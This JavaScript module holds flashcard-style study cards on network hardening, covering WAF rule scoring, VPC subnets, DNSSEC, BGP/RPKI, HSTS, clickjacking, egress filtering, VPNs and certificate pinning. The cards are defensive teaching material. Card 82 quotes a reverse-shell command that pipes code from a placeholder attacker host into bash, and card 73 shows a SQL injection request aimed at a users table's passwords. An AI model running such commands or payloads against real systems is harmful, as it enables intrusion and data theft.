// scripts/data_security/cat07_network_hardening.cjs
const { card } = require('../sec_builder_helper.cjs');

const cat = "Network & Infrastructure Hardening";

module.exports = [
  card(
    73,
    cat,
    "WAF Architecture & OWASP Core Rule Set (CRS)",
    "must-know",
    "intermediate",
    "How does a Web Application Firewall (WAF) inspect Layer 7 traffic and how does the OWASP Core Rule Set (CRS) anomaly scoring work?",
    "A WAF sits in front of web applications (at CDN/Load Balancer) to inspect incoming HTTP requests against signatures and heuristics for SQLi, XSS, RCE, and protocol violations before requests reach application compute.",
    "The OWASP ModSecurity Core Rule Set (CRS) uses Anomaly Scoring rather than immediate blocking. Instead of terminating a request on the first matched rule (which causes false positives), each triggered rule adds an anomaly score based on severity (Critical = 5, Error = 4, Warning = 3, Notice = 2). At the end of the inspection phase, if the cumulative inbound anomaly score exceeds a threshold (typically 5 for production), the WAF blocks the request with HTTP 403. CRS covers: SQLi (942xxx), XSS (941xxx), LFI (930xxx), RCE (932xxx), and Session Fixation (943xxx).",
    `// Conceptual CRS Anomaly Scoring Flow:
// 1. Request arrives: GET /search?q=1%27%20UNION%20SELECT%20password%20FROM%20users
// 2. Rule 942100 matches: SQL Injection Detected via libinjection (+5 score)
// 3. Rule 942140 matches: Restriced SQL Keyword 'UNION' (+5 score)
// 4. Rule 942190 matches: Restriced SQL Keyword 'SELECT' (+5 score)
// 5. Total Inbound Anomaly Score: 15 (Threshold = 5)
// 6. Action: WAF returns 403 Forbidden before backend receives any bytes!`,
    "Tune WAFs in detection-only mode first to baseline legitimate application traffic and eliminate false positives before switching to blocking mode.",
    ["waf", "owasp-crs", "modsecurity", "anomaly-scoring", "layer7-defense"]
  ),
  card(
    74,
    cat,
    "VPC Architecture: Public, Private & Isolated Database Subnets",
    "must-know",
    "intermediate",
    "How does the three-tier VPC subnet pattern enforce strict network isolation between public internet traffic, application workloads, and database clusters?",
    "The three-tier VPC architecture partitions a network into: 1) Public Subnets (only internet-facing ALB/NAT Gateways, with Internet Gateway routes); 2) Private App Subnets (application containers/compute, outbound internet via NAT only, zero public IPs); 3) Isolated Data Subnets (databases/caches, zero internet access inbound or outbound).",
    "Allowing direct public IP addresses on application compute or database instances invites brute force and port scans. In a hardened three-tier architecture: Internet Gateways (IGW) route traffic exclusively to public Application Load Balancers. Application EC2 instances or EKS pods sit in Private Subnets with only private RFC 1918 IPs (e.g. 10.0.10.x); they communicate to external APIs via outbound NAT Gateways. Databases (Aurora/RDS) sit in Isolated Subnets with neither an IGW nor a NAT Gateway route, ensuring that even if an attacker compromises a database credential, they cannot connect over the public internet.",
    `// Three-Tier Subnet Routing Architecture:
// Tier 1: Public Subnet (10.0.1.0/24)
// Route Table: 0.0.0.0/0 -> igw-xxx (Internet Gateway)
// Resources: ALB, NAT Gateway

// Tier 2: Private App Subnet (10.0.10.0/24)
// Route Table: 0.0.0.0/0 -> nat-xxx (NAT Gateway in Public Subnet)
// Resources: ECS Tasks, EKS Worker Nodes

// Tier 3: Isolated Database Subnet (10.0.20.0/24)
// Route Table: Local VPC routing ONLY (10.0.0.0/16 -> local)
// Resources: RDS Postgres, ElastiCache Redis`,
    "Never attach an Internet Gateway (IGW) route to your database subnets. Databases must be reachable strictly over private VPC IP addresses.",
    ["vpc", "subnets", "network-isolation", "nat-gateway", "aws-networking"]
  ),
  card(
    75,
    cat,
    "Security Groups vs Network Access Control Lists (NACLs)",
    "must-know",
    "intermediate",
    "What is the difference between stateful Security Groups and stateless NACLs in AWS/cloud network defense?",
    "Security Groups operate at the instance/ENI virtual network interface level and are stateful (inbound allowed traffic automatically permits return outbound traffic). NACLs operate at the subnet boundary and are stateless (inbound and outbound rules must be explicitly defined).",
    "Because Security Groups are stateful, if you allow inbound TCP on port 443, the response traffic on ephemeral ports (1024-65535) is automatically allowed without explicit outbound rules. NACLs evaluate numbered sequential rules (100, 200, *) at the subnet perimeter before packets reach an instance. If a packet matches a DENY rule at rule 100, it is immediately dropped. Security Groups provide granular micro-segmentation per service role (e.g. allowing AppSG to connect to DbSG on port 5432), while NACLs act as coarse-grained subnet blast walls (e.g. blocking known malicious CIDR blocks).",
    `// Security Group Rule: Reference by SG ID, NOT IP CIDR!
// Database Security Group (sg-database):
// Inbound:
// Type: PostgreSQL (5432)
// Source: sg-app-servers (References Application Security Group ID!)
// Outbound: Default None needed (Stateful return automatically permitted)

// NACL Subnet Rule (Stateless - Requires Ephemeral Port Outbound!):
// Inbound: Rule 100 | TCP 443 | ALLOW 0.0.0.0/0
// Outbound: Rule 100 | TCP 1024-65535 | ALLOW 0.0.0.0/0 # MANDATORY for return traffic!`,
    "Always reference Security Group IDs as sources in other Security Groups (e.g. allow sg-api to connect to sg-db), rather than hardcoding IP ranges.",
    ["security-groups", "nacls", "stateful-firewall", "cloud-networking"]
  ),
  card(
    76,
    cat,
    "Bastion Hosts vs AWS SSM Session Manager",
    "must-know",
    "intermediate",
    "Why has AWS Systems Manager (SSM) Session Manager superseded traditional SSH Bastion (Jump) Hosts in enterprise infrastructure?",
    "SSM Session Manager provides secure shell and port forwarding into private instances without opening inbound port 22 (SSH), without assigning public IP addresses, and without managing long-lived SSH private keys, logging all keystrokes to encrypted S3/CloudWatch logs.",
    "Traditional Bastion hosts are high-risk targets: they require open inbound port 22 from the internet, expose SSH daemon vulnerabilities to scanners, and rely on developer SSH keys that are difficult to rotate or revoke upon employee departure. With SSM Session Manager: 1) The AWS SSM Agent inside the private instance opens an outbound HTTPS connection (TLS 443) to the SSM service endpoint; 2) Zero inbound ports are open; 3) Authentication is governed by IAM policies and corporate SSO (Okta/Entra); 4) MFA is enforced via IAM condition keys; 5) Every shell command executed is cryptographically recorded for compliance audits.",
    `# Connecting securely via AWS SSM CLI without SSH keys or open ports:
aws ssm start-session --target i-0123456789abcdef0

# Port forwarding local port to private remote Postgres RDS:
aws ssm start-session \\
  --target i-0123456789abcdef0 \\
  --document-name AWS-StartPortForwardingSessionToRemoteHost \\
  --parameters '{"host":["postgres.internal.vpc"],"portNumber":["5432"],"localPortNumber":["5432"]}'`,
    "Close port 22 in all Security Groups. Use AWS SSM Session Manager or GCP Identity-Aware Proxy (IAP) for administrative shell access.",
    ["ssm-session-manager", "bastion-hosts", "ssh-hardening", "zero-inbound-ports"]
  ),
  card(
    77,
    cat,
    "AWS PrivateLink & VPC Endpoints",
    "must-know",
    "intermediate",
    "How does AWS PrivateLink (VPC Interface Endpoints) keep internal traffic to AWS services and SaaS partners off the public internet?",
    "AWS PrivateLink provides private connectivity between VPCs and supported AWS services (S3, KMS, DynamoDB, Secrets Manager) using Elastic Network Interfaces (ENIs) with private IP addresses in your subnet, eliminating the need for Internet Gateways, NAT Gateways, or public IP routing.",
    "When a private application queries S3 or AWS Secrets Manager without a VPC endpoint, the traffic must traverse an outbound NAT Gateway and route over the public internet to AWS's public API endpoints, exposing traffic to potential interception and incurring high NAT data transfer fees ($0.045/GB). With PrivateLink: 1) An Interface Endpoint allocates a private IP (e.g. 10.0.1.45) directly inside your private subnet; 2) Private DNS automatically overrides s3.amazonaws.com to resolve to the local ENI IP; 3) Traffic stays entirely within the private AWS network backbone.",
    `// VPC Endpoint Policy Restricting Access to Specific Enterprise Bucket
{
  "Statement": [
    {
      "Sid": "RestrictToEnterpriseBucketOnly",
      "Principal": "*",
      "Action": ["s3:GetObject", "s3:PutObject"],
      "Effect": "Allow",
      "Resource": "arn:aws:s3:::enterprise-corporate-vault/*"
    }
  ]
}`,
    "PrivateLink drastically reduces NAT Gateway data processing bills while keeping proprietary data traffic 100% off public internet fiber routes.",
    ["privatelink", "vpc-endpoints", "nat-gateway", "network-security"]
  ),
  card(
    78,
    cat,
    "DNS Security: DNSSEC & Cache Poisoning (Kaminsky Attack)",
    "advanced",
    "advanced",
    "How does the Kaminsky DNS Cache Poisoning attack work and how does DNSSEC provide cryptographic verification of DNS records?",
    "DNS Cache Poisoning tricks a recursive resolver into caching fraudulent IP addresses for a domain. DNSSEC (Domain Name System Security Extensions) attaches cryptographic digital signatures (RRSIG) to DNS records, authenticated through a hierarchical chain of trust from the root zone ('.') down to the authoritative nameserver.",
    "Dan Kaminsky discovered that because classic DNS over UDP used only a 16-bit Transaction ID and fixed query ports, an attacker could flood a resolver with forged responses for random non-existent subnames (123.bank.com) while injecting an authoritative NS record pointing bank.com to the attacker's nameserver. DNSSEC neutralizes spoofing by signing record sets (RRsets). The resolver verifies the signature against the DNSKEY record, which is signed by the top-level domain (.com DS record), linking to the ICANN root zone key.",
    `# Checking DNSSEC validation using dig:
dig +dnssec +multiline enterprise.com A

# A validated response includes:
# enterprise.com. 300 IN A 198.51.100.1
# enterprise.com. 300 IN RRSIG A 13 2 300 (
#   20261115000000 20261101000000 48123 enterprise.com.
#   mP0Q3x... cryptographic digital signature ... )`,
    "Enable DNSSEC on all domain registrars and authoritative DNS providers (Route 53 / Cloudflare) to prevent recursive resolver cache poisoning.",
    ["dnssec", "dns-cache-poisoning", "kaminsky-attack", "dns-security"]
  ),
  card(
    79,
    cat,
    "BGP Hijacking & Route Leaks",
    "advanced",
    "advanced",
    "How does BGP Hijacking redirect global internet traffic to rogue Autonomous Systems and how does RPKI (Resource Public Key Infrastructure) mitigate it?",
    "BGP (Border Gateway Protocol) governs routing between Autonomous Systems (AS) on the internet based on implicit trust. In a BGP Hijack, a rogue or misconfigured network advertises a more specific IP prefix (e.g. advertising /24 instead of the legitimate /22), tricking global routers into routing victim traffic through the rogue AS.",
    "Famous attacks (like the 2018 MyEtherWallet attack) hijacked Amazon Route 53 IP ranges via BGP to intercept DNS queries and steal cryptocurrency. Because BGP chooses routes based on shortest path and most-specific prefix without verifying ownership, false announcements propagate globally in minutes. RPKI solves this using cryptographic Route Origin Authorizations (ROAs): Regional Internet Registries (RIPE, ARIN) sign ROAs asserting which AS is authorized to announce specific IP prefixes. Internet Service Providers running RPKI Route Origin Validation (ROV) automatically drop invalid BGP announcements.",
    `// RPKI Route Origin Authorization (ROA) Structure:
// Prefix: 198.51.100.0/24
// Max Length: /24
// Authorized ASN: AS13335 (Cloudflare)
// Cryptographic Signature: Signed by Regional Internet Registry (ARIN/RIPE)
// Routers evaluating BGP announcements compare the announcing ASN against the signed ROA.
// If an unauthorized ASN announces 198.51.100.0/24 -> BGP Route marked INVALID and dropped!`,
    "Ensure all public IP prefixes owned by your enterprise have signed ROAs registered with your Regional Internet Registry (RIR) to prevent BGP hijacking.",
    ["bgp", "bgp-hijacking", "rpki", "routing-security", "autonomous-systems"]
  ),
  card(
    80,
    cat,
    "HTTP Strict Transport Security (HSTS) & HSTS Preload",
    "must-know",
    "intermediate",
    "How does HSTS prevent SSL Stripping attacks (Moxie Marlinspike's sslstrip) and why is submitting to the HSTS Preload List necessary?",
    "HSTS (HTTP Strict Transport Security) informs the browser via the 'Strict-Transport-Security' response header that the domain must NEVER be contacted over unencrypted HTTP. Submitting to the HSTS Preload list hardcodes this requirement directly into browser source code, protecting first-time visitors.",
    "When a user types 'bank.com' into a browser URL bar, the browser initially connects over plaintext 'http://bank.com' before being redirected to HTTPS. In an SSL Stripping attack, an attacker on the same network (e.g. coffee shop Wi-Fi) intercepts the initial HTTP request, establishes HTTPS with the bank, and serves the victim unencrypted HTTP, stripping encryption. HSTS headers instruct the browser to auto-upgrade all requests internally. However, a user's first visit is still vulnerable. The HSTS Preload list (managed by Google and baked into Chrome/Firefox/Safari) ensures the browser auto-upgrades to HTTPS even on the very first visit.",
    `// Production HSTS Response Header Configuration
// max-age=63072000: 2 years cache
// includeSubDomains: Enforces HTTPS across all subdomains (*.enterprise.com)
// preload: Required tag to qualify for browser preload list submission (hstspreload.org)

res.setHeader(
  'Strict-Transport-Security',
  'max-age=63072000; includeSubDomains; preload'
);`,
    "Once preloaded, if any subdomain lacks a valid SSL certificate, users will be completely blocked from visiting with un-bypassable security warnings.",
    ["hsts", "hsts-preload", "ssl-stripping", "transport-security"]
  ),
  card(
    81,
    cat,
    "Clickjacking Defense: X-Frame-Options vs frame-ancestors CSP",
    "must-know",
    "intermediate",
    "How does Clickjacking (UI Redressing) exploit transparent IFrames, and why is CSP's 'frame-ancestors' directive superior to legacy X-Frame-Options?",
    "Clickjacking overlays an invisible transparent IFrame of an authenticated target site on top of a lure webpage, tricking a user into clicking invisible buttons (e.g. 'Delete Account' or 'Authorize Payment') while believing they are playing a game or clicking a harmless link.",
    "Legacy mitigation used the 'X-Frame-Options: DENY' or 'SAMEORIGIN' header. However, X-Frame-Options lacks flexibility: it cannot whitelist multiple trusted partner domains or specify exact subdomain ancestries. CSP Level 2 introduced 'frame-ancestors', which obsoletes X-Frame-Options: frame-ancestors 'none' blocks all framing; frame-ancestors 'self' https://partner.com allows framing strictly by approved parents. Modern browsers ignore X-Frame-Options when frame-ancestors is present.",
    `// Modern Complete Clickjacking Defense Headers
export function antiClickjackingHeaders(res: Response) {
  // 1. Modern standard: CSP frame-ancestors
  res.setHeader(
    'Content-Security-Policy',
    "frame-ancestors 'none';" // Disallow all framing completely!
  );

  // 2. Legacy fallback for older browsers
  res.setHeader('X-Frame-Options', 'DENY');
}`,
    "Use 'frame-ancestors none' by default for all sensitive dashboards and mutation endpoints. Only loosen to specific parent origins if building embedded widgets.",
    ["clickjacking", "x-frame-options", "frame-ancestors", "ui-redressing"]
  ),
  card(
    82,
    cat,
    "Egress Traffic Filtering & Data Exfiltration Prevention",
    "must-know",
    "intermediate",
    "Why is egress (outbound) network filtering just as critical as ingress filtering in stopping Command & Control (C2) and data exfiltration?",
    "When an attacker achieves Remote Code Execution (RCE) on a server, they must establish an outbound connection to a Command & Control (C2) server to download tools or exfiltrate stolen database records. Restricting outbound egress traffic starves the adversary.",
    "Many organizations configure default-allow egress ('0.0.0.0/0 on all outbound ports'), allowing compromised containers to execute reverse shells (curl evil.com/shell | bash) and exfiltrate data over DNS, HTTPS, or raw TCP. Egress hardening requires: 1) Default-deny outbound firewall rules; 2) Outbound Forward Proxy with TLS Inspection / SNI filtering: compute instances can only contact whitelisted external domains (e.g. api.stripe.com, s3.us-east-1.amazonaws.com); 3) Blocking outbound DNS to public resolvers (preventing DNS tunneling exfiltration).",
    `// Kubernetes Egress NetworkPolicy: Restrict Pod to Database and Specific Whitelisted API
/*
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: restrict-worker-egress
spec:
  podSelector:
    matchLabels:
      app: worker
  policyTypes:
  - Egress
  egress:
  # Allow connecting to internal database pod only
  - to:
    - podSelector:
        matchLabels:
          app: postgres
    ports:
    - protocol: TCP
      port: 5432
  # Allow internal CoreDNS resolution
  - to:
    - namespaceSelector: {}
      podSelector:
        matchLabels:
          k8s-app: kube-dns
    ports:
    - protocol: UDP
      port: 53
*/`,
    "A server that cannot connect outbound to untrusted IPs cannot establish a reverse shell. Treat egress filtering as a core defense-in-depth barrier.",
    ["egress-filtering", "data-exfiltration", "c2-defense", "network-policies"]
  ),
  card(
    83,
    cat,
    "Modern VPNs: WireGuard vs OpenVPN / IPsec",
    "must-know",
    "intermediate",
    "Why has WireGuard revolutionized secure network tunneling over legacy OpenVPN and IPsec architectures?",
    "WireGuard operates with under 4,000 lines of kernel code (compared to over 100,000 for OpenVPN/IPsec), utilizes state-of-the-art modern cryptography (Noise protocol, Curve25519, ChaCha20-Poly1305, BLAKE2s), runs directly in the Linux kernel space, and achieves instant connection handshakes without negotiation overhead.",
    "Legacy VPNs (IPsec, OpenVPN) are notoriously complex, requiring fragile multi-stage negotiations (IKEv1/IKEv2), hundreds of selectable cipher combinations (many outdated like DES or CBC), and high CPU overhead from userspace/kernel context switching. WireGuard introduces 'Cryptokey Routing': it associates public encryption keys directly with internal tunnel IP addresses. If an incoming packet decrypts with public key K, it must have come from IP 10.0.0.2. WireGuard is silent when idle (dropping unauthenticated packets without responding, preventing port scanning) and roams seamlessly across networks when mobile IPs change.",
    `# WireGuard Configuration (/etc/wireguard/wg0.conf)
[Interface]
Address = 10.0.0.1/24
ListenPort = 51820
PrivateKey = <Server-Private-Key>

[Peer]
# Binds client's public key directly to their assigned tunnel IP
PublicKey = <Client-Public-Key>
AllowedIPs = 10.0.0.2/32`,
    "WireGuard's minimal codebase makes it mathematically auditable for formal verification, vastly reducing the vulnerability footprint compared to OpenVPN.",
    ["wireguard", "vpn", "cryptokey-routing", "tunneling-security", "modern-crypto"]
  ),
  card(
    84,
    cat,
    "TLS Inspection, MitM Proxies & Certificate Pinning",
    "advanced",
    "advanced",
    "What are the benefits and risks of enterprise TLS Inspection (Break-and-Inspect), and how does Certificate Pinning interact with it?",
    "TLS Inspection (MitM proxy) decrypts corporate network traffic at an egress gateway using a private enterprise root CA installed on managed devices, allowing security tools to scan outbound traffic for malware and data loss (DLP). Certificate Pinning hardcodes expected public keys in client apps, deliberately breaking TLS inspection.",
    "While TLS inspection provides DLP visibility, it creates a single point of failure: the inspection proxy re-encrypts traffic, sometimes using weaker cipher suites or failing to validate upstream certificate revocation. Mobile applications handling sensitive data often implement Certificate Pinning (e.g. embedding the SHA-256 hash of the server's Subject Public Key Info (SPKI) directly into the binary). If a corporate proxy or attacker intercepts the connection with a proxy certificate, the pinned mobile app detects the hash mismatch and immediately aborts the connection, defending against rogue CAs.",
    `// Mobile / Client SPKI Certificate Pinning (OkHttp / React Native)
/*
CertificatePinner certificatePinner = new CertificatePinner.Builder()
    .add("api.enterprise.com", "sha256/k2v657xUM4MpNGnMxoGuQIWhJ0Wfi2z4gu0GWj290gs=")
    .add("api.enterprise.com", "sha256/backupPinHashForRotation...")
    .build();

OkHttpClient client = new OkHttpClient.Builder()
    .certificatePinner(certificatePinner)
    .build();
*/`,
    "Always pin to the public key (SPKI), not the certificate leaf bytes. Pinning to the leaf certificate causes outages when certificates are renewed.",
    ["tls-inspection", "mitm-proxy", "certificate-pinning", "spki", "dlp"]
  )
];
